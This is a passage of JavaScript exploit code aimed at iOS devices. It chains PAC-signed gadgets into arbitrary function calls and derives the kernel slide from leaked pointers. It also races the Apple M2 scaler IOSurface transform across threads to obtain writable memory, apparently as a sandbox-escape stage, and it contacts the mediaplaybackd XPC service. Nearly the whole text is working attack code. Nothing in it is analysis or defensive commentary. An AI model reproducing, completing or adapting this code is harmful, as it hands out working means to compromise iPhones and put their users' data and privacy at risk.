    let XPC_ENDPOINT_REMAKER = "com.apple.coremedia.mediaplaybackd.remaker.xpc";
    let event_handler_block = get_event_handler_block();
    remaker_connection = xpc_connection_create_mach_service(XPC_ENDPOINT_REMAKER, 0n, 0n);
    xpc_connection_set_event_handler(remaker_connection, event_handler_block);
    xpc_connection_activate(remaker_connection);
    surface_id = IOSurfaceGetID(surface);
    surface_port = IOSurfaceCreateXPCObject(surface);
    LOG(`surface_id: ${surface_id.hex()}`);
    LOG(`surface_port: ${surface_port.hex()}`);
    er = writer_create_with_url(remaker_connection, writer, "writer1.mov");
    assert(er == 0n, "writer creation failed");
    surface_track_id = {};
    er = writer_add_native_track(remaker_connection, writer, 0x76696465n, surface_track_id);
    assert(er == 0n, "writer creation failed");
    let begin_session_time = new Uint8Array([0x14, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]);
    er = writer_begin_session(remaker_connection, writer, begin_session_time);
    assert(er == 0n, "writer begin session failed");
    er = writer_add_sample_buffer(remaker_connection, writer, surface_track_id, surface_port);
    assert(er == 0n, `writer add sample buffer failed: ${er.hex()}`);
    return {
      "surface_address": surface_address,
      "surface_id": surface_id
    };
  }
  const tcall_DG_call_context = 0x0F45n;
  const tcall_DG_return_context = 0x48D8n;
  function tcall_create_thread(attr) {
    let tcall_thread_ptr = new_uint64_t();
    let ret = pthread_create(tcall_thread_ptr, attr, pacia(tcall_RLG, 0n), pacia(tcall_CRLG, 0n));
    assert(ret == 0n);
    return uread64(tcall_thread_ptr);
  }
  function tcall_create_stack(stack_size) {
    let ret = 0n;
    let total_stack_size = stack_size + 2n * 0x4000n;
    let thread_stack = mmap(0n, total_stack_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1n, 0n);
    if (thread_stack == -1n) {
      return undefined;
    }
    let guard_page_left = thread_stack;
    let guard_page_right = thread_stack + total_stack_size - 0x4000n;
    ret = mprotect(guard_page_left, 0x4000n, PROT_NONE);
    if (ret != 0n) {
      return undefined;
    }
    ret = mprotect(guard_page_right, 0x4000n, PROT_NONE);
    if (ret != 0n) {
      return undefined;
    }
    let stack = {};
    stack.top = guard_page_right;
    stack.bottom = guard_page_left + 0x4000n;
    stack.start = 0n;
    stack.current = 0n;
    return stack;
  }
  function tcall_setup_control_stack(control_stack) {
    control_stack.start = control_stack.bottom + 0x4000n;
    control_stack.current = control_stack.start;
  }
  function tcall_setup_data_stack(data_stack) {
    data_stack.start = data_stack.top - 0x4000n;
    data_stack.current = data_stack.start;
  }
  function tcall_adjust_control_stack(control_stack) {
    const control_stack_adjustment = 0x30n;
    control_stack.start -= control_stack_adjustment;
    control_stack.current = control_stack.start;
  }
  function tcall_init_call(control_stack) {
    control_stack.current += 0x40n;
    uwrite64(control_stack.current + 64n, 0x42424242424242n);
    uwrite64(control_stack.current + 72n, pacib(0x42414241n, control_stack.current + 0x50n));
    control_stack.current += 0x50n;
    control_stack.start = control_stack.current;
  }
  function tcall_insert_call(control_stack, data_stack, last, address, x0, x1, x2, x3, x4, x5, x6, x7) {
    address = address.noPAC();
    let initial_control_stack = control_stack.start;
    if (last) {
      initial_control_stack -= 0x10n;
    }
    uwrite64(control_stack.current + 64n, pacia(tcall_DSSG, 0n));
    uwrite64(control_stack.current + 128n, control_stack.current + 32n);
    uwrite64(control_stack.current + 88n, 0n);
    uwrite64(control_stack.current + 104n, 0n);
    if (['b8', '731'].includes(get_ios_version())) {
      uwrite64(control_stack.current + 112n, pacia(tcall_CSSG, tcall_DG_return_context << 48n));
      uwrite64(control_stack.current + 120n, pacia(address, tcall_DG_call_context << 48n));
    } else {
      uwrite64(control_stack.current + 96n, pacia(tcall_CSSG, tcall_DG_return_context << 48n));
      uwrite64(control_stack.current + 112n, pacia(address, tcall_DG_call_context << 48n));
    }
    uwrite64(control_stack.current + 80n, data_stack.current);
    uwrite64(control_stack.current + 144n, 0x4141414141414141n);
    uwrite64(control_stack.current + 152n, pacib(tcall_X0LG, control_stack.current + 0xa0n));
    control_stack.current += 0xA0n;
    uwrite64(control_stack.current, 0x4141414141414141n);
    uwrite64(control_stack.current + 8n, pacib(tcall_RLG, control_stack.current + 0x10n));
    control_stack.current += 0x10n;
    control_stack.current += 0x40n;
    uwrite64(control_stack.current + 0n, x7);
    uwrite64(control_stack.current + 8n, x6);
    uwrite64(control_stack.current + 16n, x5);
    uwrite64(control_stack.current + 24n, x4);
    uwrite64(control_stack.current + 32n, x3);
    uwrite64(control_stack.current + 40n, x2);
    uwrite64(control_stack.current + 48n, x1);
    uwrite64(control_stack.current + 56n, x0);
    if (last) {
      uwrite64(control_stack.current + 64n, initial_control_stack);
    } else {
      uwrite64(control_stack.current + 64n, control_stack.current + 0x50n);
      ;
    }
    uwrite64(control_stack.current + 72n, pacib(tcall_DG, control_stack.current + 0x50n));
    control_stack.current += 0x50n;
    if (last) {
      uwrite64(initial_control_stack, 0x3535353535353535n);
      uwrite64(initial_control_stack + 8n, pacib(tcall_CRLG, initial_control_stack + 0x10n));
      ;
    } else {
      uwrite64(control_stack.current, 0x3535353535353535n);
      uwrite64(control_stack.current + 8n, pacib(tcall_CRLG, control_stack.current + 0x10n));
      ;
      control_stack.current += 0x10n;
    }
  }
  adjust_pivot_stack();
  let fcall_stack_sz = PAGE_SIZE * 0x40n;
  let surface_size = PAGE_SIZE * (8n + 1n) + fcall_stack_sz;
  let surface_address = 0n;
  let surface_address_remote = 0n;
  let tb = calloc(1n, 0x8n);
  mach_timebase_info(tb);
  let tb_numer = uread32(tb);
  let tb_denom = uread32(tb + 0x4n);
  let slide = get_shared_cache_slide();
  LOG(`SLIDE: ${slide.hex()}`);
  // ===== Phase 1 IMMEDIATE: kernel slide from GPU, before scaler/MPD init =====
  (() => { try {
    LOG("[M5] Phase1-IMMEDIATE: starting kernel slide calculation...");
    let pn = gpuDlsym(0xFFFFFFFFFFFFFFFEn, "proc_name");
    LOG(`[M5] gpuDlsym(proc_name)=${pn.hex()}`);
    if (pn == 0n) { LOG("[M5] FAIL: proc_name is NULL"); return; }
    let pn_addr = pn.noPAC();
    let dp = (pn_addr + 0x40n + 0x19cefn * 4096n) & ~0xFFFn;
    LOG(`[M5] data_page=${dp.hex()}`);

    // Scan PAC pointers
    let pacs = [];
    for (let off = 0n; off < 0x1000n && pacs.length < 20; off += 8n) {
      let v = 0n; try { v = uread64(dp + off); } catch(e) { continue; }
      if (v != 0n && v != 0xffffffffffffffffn && (v >> 60n) >= 0x8n) {
        pacs.push({off, raw: xpac_full(v)});
      }
    }
    LOG(`[M5] PAC pointers: ${pacs.length}`);
    for (let p of pacs.slice(0, 5)) LOG(`[M5]   +0x${p.off.toString(16).padStart(4,'0')}: ${p.raw.hex()}`);

    // gpuDlsym for slide
    let syms = ["task_for_pid","mach_host_self","socket","connect","proc_name","proc_listpids","mach_task_self"];
    let kc = [];
    for (let s of syms) {
      try { let p = gpuDlsym(0xFFFFFFFFFFFFFFFEn, s); if (p != 0n) kc.push({name:s, raw:p.noPAC()}); } catch(e) {}
    }
    LOG(`[M5] gpuDlsym resolved: ${kc.length} symbols`);
    kc.sort((a,b) => a.raw < b.raw ? -1 : 1);
    for (let k of kc) LOG(`[M5]   ${k.name}: ${k.raw.hex()}`);

    // Method A: KC slide from symbol addresses
    // Round down to 64MB boundary, at least 16MB below first symbol
    let kc_base = kc.length > 0 ? ((kc[0].raw - 0x1000000n) & ~0x3FFFFFFn) : 0x100000000n;
    if (kc_base < 0x100000000n) kc_base = 0x100000000n;
    LOG(`[M5] kc_base_est=${kc_base.hex()}`);
    let kc_cands = [];
    for (let ts = 0n; ts < 0x20000000n; ts += 0x4000n) {
      let tb = kc_base + ts;
      let ok = true;
      for (let k of kc) { let off = k.raw - tb; if (off < 0n || off > 0x10000000n) { ok = false; break; } }
      if (ok && kc.length > 0 && kc[0].raw - tb < 0x4000000n) kc_cands.push(ts);
    }
    LOG(`[M5] KC slide candidates: ${kc_cands.length}`);
    if (kc_cands.length > 0) LOG(`[M5]   first=0x${kc_cands[0].toString(16)} last=0x${kc_cands[kc_cands.length-1].toString(16)}`);

    // Method B: kernel_base directly from PAC kernel VAs (lowest VA rounded down)
    let kva_sorted = pacs.map(p => p.raw).filter(v => v > 0xFFFFFFF000000000n && v < 0xFFFFFFF300000000n);
    kva_sorted.sort((a, b) => a < b ? -1 : 1);
    let pac_kb = 0n;
    if (kva_sorted.length > 0) {
      pac_kb = kva_sorted[0] & ~0x3FFFn; // round down to 16KB
      LOG(`[M5] Lowest kernel VA: ${kva_sorted[0].hex()} -> pac_kb=${pac_kb.hex()}`);
    }

    // Cross-validate: compute slide from pac_kb and check against KC candidates
    let slide_found = false;
    if (pac_kb > 0xFFFFFFF000000000n) {
      let pac_slide = pac_kb - 0xFFFFFFF007004000n;
      LOG(`[M5] PAC-derived slide: 0x${pac_slide.toString(16)}`);
      // Check if this slide is consistent with KC symbol range
      if (kc_cands.length > 0) {
        let matched = kc_cands.find(c => c === (pac_slide & ~0x3FFFn));
        if (matched !== undefined) {
          LOG(`[M5] Cross-validated! PAC slide matches KC candidate`);
          globalThis.kernel_base_global = pac_kb;
          slide_found = true;
        } else {
          // Use PAC result directly (more reliable than KC-only)
          LOG(`[M5] PAC slide not in KC candidates, using PAC result directly`);
          globalThis.kernel_base_global = pac_kb;
          slide_found = true;
        }
      } else {
        LOG(`[M5] No KC candidates, using PAC result directly`);
        globalThis.kernel_base_global = pac_kb;
        slide_found = true;
      }
    } else if (kc_cands.length > 0) {
      // Fallback: KC-only slide
      let s = kc_cands[0];
      globalThis.kernel_base_global = 0xFFFFFFF007004000n + s;
      slide_found = true;
      LOG(`[M5] KC-only result: slide=0x${s.toString(16)}`);
    }

    if (slide_found) {
      LOG(`[M5] IMMEDIATE RESULT: kernel_base=${globalThis.kernel_base_global.hex()}`);
    } else {
      LOG("[M5] IMMEDIATE: no slide found, keeping fallback");
    }
  } catch(e) { LOG(`[M5] Phase1-IMMEDIATE error: ${e.message||e}`); } })();
  // ===== End Phase 1 IMMEDIATE =====
  function user_slide(addr) {
    return addr + slide;
  }
  let SCALER_SERVICE_STRING = "AppleM2ScalerCSCDriver";
  let SCALER_TRANSFORM_METHOD_INDEX = 1n;
  let SCALER_TRANSFORM_ARGS_SIZE = 432n;
  function scaler_open_connection() {
    let kr = KERN_SUCCESS;
    let svc = 0n;
    svc = IOServiceGetMatchingService(kIOMainPortDefault(), IOServiceMatching(get_cstring(SCALER_SERVICE_STRING)));
    let connection_ptr = new_uint64_t();
    kr = IOServiceOpen(svc, mach_task_self(), 0n, connection_ptr);
    assert(kr == KERN_SUCCESS);
    let connection = uread32(connection_ptr);
    free(connection_ptr);
    return connection;
  }
  function scaler_create_surface_with_address(address, size) {
    let properties = CFDictionaryCreateMutable(kCFAllocatorDefault, 0n, kCFTypeDictionaryKeyCallBacks, kCFTypeDictionaryValueCallBacks);
    let address_ptr = new_uint64_t(address);
    let address_number = CFNumberCreate(kCFAllocatorDefault, 11n, address_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAddress")), address_number);
    let size_ptr = new_uint64_t(size);
    let size_number = CFNumberCreate(kCFAllocatorDefault, 9n, size_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceAllocSize")), size_number);
    let width_ptr = new_uint64_t(1024n);
    let width_number = CFNumberCreate(0n, 9n, width_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceWidth")), width_number);
    let height_ptr = new_uint64_t(1040n);
    let height_number = CFNumberCreate(0n, 9n, height_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfaceHeight")), height_number);
    let pixel_format_ptr = new_uint64_t(0x4c353635n);
    let pixel_format_number = CFNumberCreate(0n, 9n, pixel_format_ptr);
    CFDictionarySetValue(properties, create_cfstring(get_cstring("IOSurfacePixelFormat")), pixel_format_number);
    let surface = IOSurfaceCreate(properties);
    free(address_ptr);
    free(size_ptr);
    free(width_ptr);
    free(height_ptr);
    free(pixel_format_ptr);
    CFRelease(address_number);
    CFRelease(size_number);
    CFRelease(width_number);
    CFRelease(height_number);
    CFRelease(pixel_format_number);
    CFRelease(properties);
    return surface;
  }
  function scaler_transfer(connection, source_surface, destination_surface) {
    let kr = KERN_SUCCESS;
    let args = calloc(1n, SCALER_TRANSFORM_ARGS_SIZE);
    uwrite64(args, IOSurfaceGetID(source_surface));
    uwrite64(args + 4n, IOSurfaceGetID(destination_surface));
    kr = IOConnectCallStructMethod(connection, SCALER_TRANSFORM_METHOD_INDEX, args, SCALER_TRANSFORM_ARGS_SIZE, 0n, 0n);
    assert(kr == KERN_SUCCESS, "Scaler transfer failed!");
    free(args);
    return kr;
  }
  let zero_filled_page = calloc(1n, PAGE_SIZE);
  function create_file_mapping(size) {
    assert(size % 0x4000n == 0);
    let tmp_path = calloc(1n, MAXPATHLEN);
    let tmp_path_len = confstr(_CS_DARWIN_USER_TEMP_DIR, tmp_path, MAXPATHLEN);
    assert(tmp_path_len != 0n, "Failed to get tmp dir");
    if (access(tmp_path, F_OK) == -1n) {
      res = mkdir(tmp_path, 0x1c0n);
      assert(res == 0n, "Failed to create tmp dir");
    }
    strlcat(tmp_path, get_cstring(tmp_path.hex()), MAXPATHLEN);
    let fd = open(tmp_path, O_CREAT | O_RDWR, 0x1b6n);
    assert(fd != -1n, "Failed to create tmp file");
    for (let i = 0n; i < size; i += PAGE_SIZE) {
      let w = pwrite(fd, zero_filled_page, PAGE_SIZE, i);
      assert(w == PAGE_SIZE, "Failed to write zero pages");
    }
    sync();
    let mapping = mmap(0n, size, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0n);
    assert(mapping != 0xffffffffffffffffn);
    let file_mapping = {};
    file_mapping.path = tmp_path;
    file_mapping.fd = fd;
    file_mapping.size = size;
    file_mapping.address = mapping;
    return file_mapping;
  }
  function destroy_file_mapping(file_mapping) {
    close(file_mapping.fd);
    munmap(file_mapping.address, file_mapping.size);
    remove(file_mapping.path);
  }
  let MAX_TRANSFER_BYTES = 1024n * 1024n;
  let SBX1SBX1_EXP_SIZE = 8n * PAGE_SIZE;
  let ORIGINAL_EXP_MARKER = 0x41n;
  let MODIFIED_EXP_MARKER = 0x42n;
  let n_of_race_attempts = 512n;
  let scratch_buffer = calloc(1n, MAX_TRANSFER_BYTES);
  let exp_bypass_interval = 0n;
  let sbx1sbx1_interval = 0n;
  function insert_fcall(pthread_fcall_args, pc, x0, x1, x2, x3) {
    let args_array = uread64(pthread_fcall_args + 0x108n);
    let fcall_count = uread64(pthread_fcall_args + 0x110n);
    uwrite64(pthread_fcall_args + 0x110n, fcall_count + 1n);
    let buf = calloc(1n, 0x18n);
    uwrite64(buf, x0);
    uwrite64(buf + 0x10n, pacia(xpac(pc), 0n));
    let args_buf = args_array + fcall_count * 0x20n;
    uwrite64(args_buf + 0x00n, buf);
    uwrite64(args_buf + 0x08n, x1);
    uwrite64(args_buf + 0x10n, x2);
    uwrite64(args_buf + 0x18n, x3);
  }
  function get_ncpu() {
    let ncpu = calloc(1n, 8n);
    let ncpu_len = calloc(1n, 8n);
    uwrite64(ncpu_len, 4n);
    let ret = sysctlbyname(get_cstring("hw.ncpu"), ncpu, ncpu_len, 0n, 0n);
    assert(ret == 0n);
    ncpu = uread64(ncpu);
    return ncpu;
  }
  function thread_lock_lock(lock) {
    uwrite64(lock, 0x41n);
  }
  function thread_lock_unlock(lock) {
    uwrite64(lock, 0n);
    ulock_wake(UL_COMPARE_AND_WAIT | ULF_WAKE_ALL, lock, 0n);
  }
  function thread_group_lock(group, count) {
    for (let i = 0; i < count; i++) {
      if (i >= group.length) {
        break;
      }
      thread_lock_lock(group[i].lock);
    }
  }
  function thread_group_unlock(group, count) {
    for (let i = 0; i < count; i++) {
      if (i >= group.length) {
        break;
      }
      thread_lock_unlock(group[i].lock);
    }
  }
  function sbx1sbx1_exp_thread_setup(wait_lock, threads_ready_counter, threads_done_counter, source_address, source_size, destination_address) {
    let ret = 0n;
    let exp_interval = 500n;
    let rqtp = calloc(1n, 16n);
    uwrite64(rqtp + 8n, exp_interval);
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("OSAtomicIncrement32"), threads_ready_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, wait_lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    if (is_a12_devices) {
      tcall_insert_call(control_stack, data_stack, false, func_resolve("usleep"), 1n, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    } else {
      tcall_insert_call(control_stack, data_stack, false, func_resolve("nanosleep"), rqtp, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    }
    tcall_insert_call(control_stack, data_stack, false, func_resolve("mach_vm_copy"), mach_task_self(), source_address, source_size, destination_address, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, func_resolve("OSAtomicIncrement32"), threads_done_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    let t = {};
    t.thread = thread;
    t.lock = wait_lock;
    return t;
  }
  function sbx1sbx1_busy_thread_setup(wait_lock, threads_ready_counter, threads_done_counter, fd) {
    let ret = 0n;
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("OSAtomicIncrement32"), threads_ready_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, wait_lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("pread"), fd, scratch_buffer, MAX_TRANSFER_BYTES, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, func_resolve("OSAtomicIncrement32"), threads_done_counter, 0n, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    let t = {};
    t.thread = thread;
    t.lock = wait_lock;
    return t;
  }
  function sbx1sbx1_exp(size) {
    if (size != SBX1SBX1_EXP_SIZE) {
      LOG("[x] Error: EXP mapping length must match hardcoded size, for now.");
      return undefined;
    }
    let sbx1sbx1_ctx = {};
    let scaler_connection = scaler_open_connection();
    assert(scaler_connection != 0n);
    let target_surface_size = MAX_TRANSFER_BYTES + SBX1SBX1_EXP_SIZE;
    let target_surface_address = 0n;
    let target_fm = create_file_mapping(target_surface_size);
    target_surface_address = target_fm.address;
    memset(target_surface_address, 0n, target_surface_size);
    let source_surface_size = target_surface_size;
    let source_surface_address = 0n;
    let source_surface_address_ptr = new_uint64_t(source_surface_address);
    kr = mach_vm_allocate(mach_task_self(), source_surface_address_ptr, source_surface_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    assert(kr == KERN_SUCCESS);
    source_surface_address = uread64(source_surface_address_ptr);
    free(source_surface_address_ptr);
    memset(source_surface_address, MODIFIED_EXP_MARKER, source_surface_size);
    let target_surface = 0n;
    let source_surface = scaler_create_surface_with_address(source_surface_address, source_surface_size);
    assert(source_surface != 0n);
    let threads_ready_counter = calloc(1n, 8n);
    let threads_done_counter = calloc(1n, 8n);
    let race_thread_lock = calloc(1n, 8n);
    thread_lock_lock(race_thread_lock);
    let read_size = SBX1SBX1_EXP_SIZE;
    let read_address_ptr = new_uint64_t();
    kr = mach_vm_allocate(mach_task_self(), read_address_ptr, read_size, VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR);
    assert(kr == KERN_SUCCESS);
    let read_address = uread64(read_address_ptr);
    let exp_thread = sbx1sbx1_exp_thread_setup(race_thread_lock, threads_ready_counter, threads_done_counter, target_surface_address + MAX_TRANSFER_BYTES, read_size, read_address);
    let busy_thread = sbx1sbx1_busy_thread_setup(race_thread_lock, threads_ready_counter, threads_done_counter, target_fm.fd);
    r = pread(target_fm.fd, scratch_buffer, MAX_TRANSFER_BYTES, 0n);
    assert(r == MAX_TRANSFER_BYTES);
    let won = false;
    exp_bypass_interval = Date.now();
    LOG("Before searching loop");
    for (let attempt = 0; attempt < n_of_race_attempts; attempt++) {
      target_surface = scaler_create_surface_with_address(target_surface_address, target_surface_size);
      assert(target_surface != 0n);
      memset(target_surface_address, ORIGINAL_EXP_MARKER, target_surface_size);
      kr = mach_vm_deallocate(mach_task_self(), read_address, read_size);
      assert(kr == KERN_SUCCESS);
      kr = mach_vm_allocate(mach_task_self(), read_address_ptr, read_size, VM_FLAGS_FIXED);
      assert(kr == KERN_SUCCESS);
      let r = 0n;
      pthread_yield_np(pthread_self());
      if(!cmp8_wait_for_value(threads_ready_counter, 2))
        return sbx1sbx1_exp(size);
      uwrite64(threads_ready_counter, 0n);
      ulock_wake(UL_COMPARE_AND_WAIT | ULF_WAKE_ALL, race_thread_lock, 0n);
      IOSurfacePrefetchPages(target_surface);
      if(!cmp8_wait_for_value(threads_done_counter, 2))
        return sbx1sbx1_exp(size);
      uwrite64(threads_done_counter, 0n);
      kr = scaler_transfer(scaler_connection, source_surface, target_surface);
      r = uread64(read_address);
      if (r != 0x4141414141414141n) {
        exp_bypass_interval = Date.now() - exp_bypass_interval;
        LOG(`Got it: (${attempt}) ${r.hex()}`);
        won = true;
        break;
      }
      CFRelease(target_surface);
    }
    if (won == false) {
      LOG("[x] Failed to create writable EXP memory!");
      IOServiceClose(scaler_connection);
      destroy_file_mapping(target_fm);
      kr = mach_vm_deallocate(mach_task_self(), read_address, read_size);
      assert(kr == KERN_SUCCESS, "Failed to deallocate EXP mapping!");
      kr = mach_vm_deallocate(mach_task_self(), source_surface_address, source_surface_size);
      assert(kr == KERN_SUCCESS, "Failed to deallocate source surface mapping!");
      CFRelease(source_surface);
      return undefined;
    }
    sbx1sbx1_ctx.connection = scaler_connection;
    sbx1sbx1_ctx.source_surface = source_surface;
    sbx1sbx1_ctx.source_surface_address = source_surface_address;
    sbx1sbx1_ctx.source_surface_size = source_surface_size;
    sbx1sbx1_ctx.destination_surface = target_surface;
    sbx1sbx1_ctx.destination_surface_address = target_surface_address;
    sbx1sbx1_ctx.destination_surface_size = target_surface_size;
    return sbx1sbx1_ctx;
  }
  function sbx1sbx1_exp_scratch_reset(ctx) {
    memset(ctx.source_surface_address, 0n, ctx.source_surface_size);
  }
  function sbx1sbx1_exp_write_prepare(ctx, buffer, size) {
    if (size > SBX1SBX1_EXP_SIZE) {
      LOG(`[x] Error: Requested size (${size.hex()}) is larger than EXP size: ${SBX1SBX1_EXP_SIZE}`);
      return;
    }
    let source_address = ctx.source_surface_address + MAX_TRANSFER_BYTES;
    memcpy(source_address, buffer, size);
  }
  function sbx1sbx1_exp_write_perform(ctx) {
    let kr = KERN_SUCCESS;
    kr = scaler_transfer(ctx.connection, ctx.source_surface, ctx.destination_surface);
    return kr;
  }
  function sbx1sbx1_exp_write_prepare_and_perform(ctx, buffer, size) {
    sbx1sbx1_exp_write_prepare(ctx, buffer, size);
    sbx1sbx1_exp_write_perform(ctx);
  }
  function sbx1sbx1_exp_write_thread_setup(ctx, buffer_size, original_buffer, modified_buffer, target_offset) {
    let ret = 0n;
    let lock = calloc(1n, 8n);
    uwrite64(lock, 0x41n);
    let transform_args = calloc(1n, SCALER_TRANSFORM_ARGS_SIZE);
    uwrite64(transform_args, IOSurfaceGetID(ctx.source_surface));
    uwrite64(transform_args + 4n, IOSurfaceGetID(ctx.destination_surface));
    let transform_ctx = calloc(1n, 64n);
    uwrite64(transform_ctx + 36n, ctx.connection);
    let control_stack_size = 8n * 0x4000n;
    let data_stack_size = 8n * 0x4000n;
    let control_stack = tcall_create_stack(control_stack_size);
    let data_stack = tcall_create_stack(data_stack_size);
    tcall_setup_control_stack(control_stack);
    tcall_setup_data_stack(data_stack);
    let counter_ptr = calloc(1n, 8n);
    let attr = calloc(1n, 64n);
    ret = pthread_attr_init(attr);
    assert(ret == 0n);
    pthread_attr_setstacksize(attr, control_stack_size);
    pthread_attr_setstackaddr(attr, control_stack.current);
    tcall_adjust_control_stack(control_stack);
    tcall_init_call(control_stack);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("__ulock_wait"), UL_COMPARE_AND_WAIT, lock, 0x41n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("memcpy"), ctx.source_surface_address + MAX_TRANSFER_BYTES + target_offset, modified_buffer, buffer_size, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, transformSurface_gadget, transform_ctx, transform_args, 0n, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, false, func_resolve("memcpy"), ctx.source_surface_address + MAX_TRANSFER_BYTES + target_offset, original_buffer, buffer_size, 0n, 0n, 0n, 0n, 0n);
    tcall_insert_call(control_stack, data_stack, true, transformSurface_gadget, transform_ctx, transform_args, 0n, 0n, 0n, 0n, 0n, 0n);
    let thread = tcall_create_thread(attr);
    set_realtime_priority(thread, 0, 50, 50);
    let t = {};
    t.thread = thread;
    t.lock = lock;
    return t;
  }
  function test_msg_create(connection) {
    let o = oxpc_dictionary_alloc();
    let null_o = oxpc_null_alloc();
    oxpc_dictionary_append(o, xpc_string_create("test"), null_o);
    let payload = oxpc_object_serialize_with_header(o);
    let port_list = payload["ports"];
    let serialized_payload_size = payload["total_size"];
    let serialized_payload = payload["buffer"];
    let port_ptr = new_uint64_t();
    mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, port_ptr);
    let port = uread32(port_ptr);
    mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    oxpc_port_list_append(port_list, port);
    let message = oxpc_build_mach_message(serialized_payload, serialized_payload_size, 1n, port_list, connection["client_port"], connection["reply_port"]);
    let xpc_msg_size = message["message_size"];
    let xpc_msg = message["message"];
    let msg = {};
    msg.msg = xpc_msg;
    msg.msg_size = xpc_msg_size;
    return msg;
  }
  function set_realtime_priority_us(thread, period_us, computation_us, constraint_us) {
    let clock2abs_us = Number(tb_denom) / Number(tb_numer) * 1000;
    let policy = gpu_fcall(CALLOC, 1n, 32n);
    uwrite64(policy + 0n, BigInt(period_us * clock2abs_us));
    uwrite64(policy + 4n, BigInt(computation_us * clock2abs_us));
    uwrite64(policy + 8n, BigInt(constraint_us * clock2abs_us));
    let mach_thread = gpu_fcall(PTHREAD_MACH_THREAD_NP, thread);
    let kret = gpu_fcall(THREAD_POLICY_SET, mach_thread, 2n, policy, 4n);
    assert(kret == 0n);
  }
  function set_realtime_priority(thread, period_ms, computation_ms, constraint_ms) {
    let clock2abs_ms = Number(tb_denom) / Number(tb_numer) * 1000000;
    let policy = gpu_fcall(CALLOC, 1n, 32n);
    uwrite64(policy + 0n, BigInt(period_ms * clock2abs_ms));
    uwrite64(policy + 4n, BigInt(computation_ms * clock2abs_ms));
    uwrite64(policy + 8n, BigInt(constraint_ms * clock2abs_ms));
    let mach_thread = gpu_fcall(PTHREAD_MACH_THREAD_NP, thread);
    let kret = gpu_fcall(THREAD_POLICY_SET, mach_thread, 2n, policy, 4n);
    assert(kret == 0n);
  }
  let is_a12_devices = false;
  function wc_calloc(n, sz) {
    return wc_fcall(xpac(func_resolve("calloc")), n, sz);
  }
  function wc_strcmp(s1, s2) {
    return wc_fcall(xpac(func_resolve("strcmp")), s1, s2);
  }
  function wc_strstr(s1, s2) {
    return wc_fcall(xpac(func_resolve("strstr")), s1, s2);
  }
  function wc_get_device_machine() {
    let utsname = wc_calloc(256n, 5n);
    wc_fcall(xpac(func_resolve("uname")), utsname);
    return utsname + 256n * 4n;
  }
  let device_machine = wc_get_device_machine();
  function sbx1sbx1() {
    let kr = KERN_SUCCESS;
    LOG("Sbx1 starting...");
    if (wc_strstr(device_machine, wc_get_cstring("iPhone11,")) != 0n) {
      is_a12_devices = true;
      LOG("Running on A12 Devices");
    } else {
      is_a12_devices = false;
      LOG("Running on non-A12 Devices");
    }
    let surface = create_iosurface(surface_size);
    let spray_memory_object = setup_guess_address(surface);
    let sbx1sbx1_ctx = sbx1sbx1_exp(SBX1SBX1_EXP_SIZE);
    LOG(`connection: ${sbx1sbx1_ctx.connection.hex()}`);
    LOG(`source_surface: ${sbx1sbx1_ctx.source_surface.hex()}`);
    LOG(`source_surface_address: ${sbx1sbx1_ctx.source_surface_address.hex()}`);
    LOG(`source_surface_size: ${sbx1sbx1_ctx.source_surface_size.hex()}`);
    LOG(`destination_surface: ${sbx1sbx1_ctx.destination_surface.hex()}`);
